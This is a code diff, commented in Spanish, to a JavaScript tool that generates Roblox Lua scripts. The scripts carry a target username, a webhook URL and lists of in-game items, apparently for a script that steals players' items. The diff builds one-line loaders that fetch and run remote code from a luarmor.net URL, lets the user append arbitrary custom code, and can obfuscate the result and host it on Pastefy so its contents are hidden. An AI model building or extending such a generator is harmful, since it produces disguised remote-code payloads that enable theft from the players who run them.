@@ -677,7 +677,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ============================================================
-    //  GENERAR SCRIPT
+    //  GENERAR SCRIPT (CORREGIDO)
     // ============================================================
     const outputSection = document.getElementById('outputSection');
     const outputCode = document.getElementById('outputCode');
@@ -706,18 +706,13 @@ document.addEventListener('DOMContentLoaded', () => {
         let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
         script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;
 
-        const modePrefix = mode === 'NORMAL' ? 'NORMAL' : 'CUSTOM';
+        // Siempre usar NORMAL_ como prefijo, incluso en modo CUSTOM
+        script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
+        script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
+        script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
 
-        if (mode === 'NORMAL') {
-            script += `getgenv().${modePrefix}_BRAINROTS = ${luaTable(brainrots)}\n`;
-            script += `getgenv().${modePrefix}_BASE_SKINS = ${luaTable(skins)}\n`;
-            script += `getgenv().${modePrefix}_GEARS = ${luaTable(gears)}\n`;
-        } else {
-            script += `getgenv().CUSTOM_LOADSTRING = [[\n${customLoadstring || '-- No custom loadstring'}\n]]\n`;
-            script += `getgenv().${modePrefix}_BRAINROTS = ${luaTable(brainrots)}\n`;
-            script += `getgenv().${modePrefix}_BASE_SKINS = ${luaTable(skins)}\n`;
-            script += `getgenv().${modePrefix}_GEARS = ${luaTable(gears)}\n`;
-        }
+        // NOTA: El código personalizado se añadirá como un segundo task.spawn en la generación final.
+        // No se guarda en una variable CUSTOM_LOADSTRING.
 
         return script;
     }
@@ -728,6 +723,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
         try {
             const configScript = buildConfigScript();
+            const mode = document.querySelector('.mode-btn.active')?.id === 'modeNormal' ? 'NORMAL' : 'CUSTOM';
+            const customLoadstring = document.getElementById('customLoadstring').value.trim();
+
+            let finalScript = configScript;
 
             if (shortEnabled) {
                 if (!isAuthenticated) {
@@ -737,27 +736,40 @@ document.addEventListener('DOMContentLoaded', () => {
                     return;
                 }
                 try {
-                    const fullScript = configScript + `
+                    let fullScript = configScript + `
                     
                     task.spawn(function()
                         loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
                     end)
                     `;
+
+                    // Si es modo CUSTOM y hay código personalizado, añadir un segundo task.spawn
+                    if (mode === 'CUSTOM' && customLoadstring) {
+                        fullScript += `\n\ntask.spawn(function()\n    ${customLoadstring.replace(/\n/g, '\n    ')}\nend)`;
+                    }
                     
                     const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
                     const pastefyUrl = await createPastefyPaste(obfuscatedScript);
-                    const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
-                    outputCode.textContent = finalScript;
+                    const finalLoadstring = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
+                    outputCode.textContent = finalLoadstring;
 
                 } catch (apiError) {
                     showNotification(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`, 'error');
-                    const fallbackScript = configScript + 
+                    // Fallback: sin ofuscar
+                    let fallbackScript = configScript + 
                         `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
+                    if (mode === 'CUSTOM' && customLoadstring) {
+                        fallbackScript += `\n\ntask.spawn(function()\n    ${customLoadstring.replace(/\n/g, '\n    ')}\nend)`;
+                    }
                     outputCode.textContent = fallbackScript;
                 }
             } else {
-                const normalScript = configScript + 
+                // Modo normal (sin short loadstring)
+                let normalScript = configScript + 
                     `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
+                if (mode === 'CUSTOM' && customLoadstring) {
+                    normalScript += `\n\ntask.spawn(function()\n    ${customLoadstring.replace(/\n/g, '\n    ')}\nend)`;
+                }
                 outputCode.textContent = normalScript;
             }
 
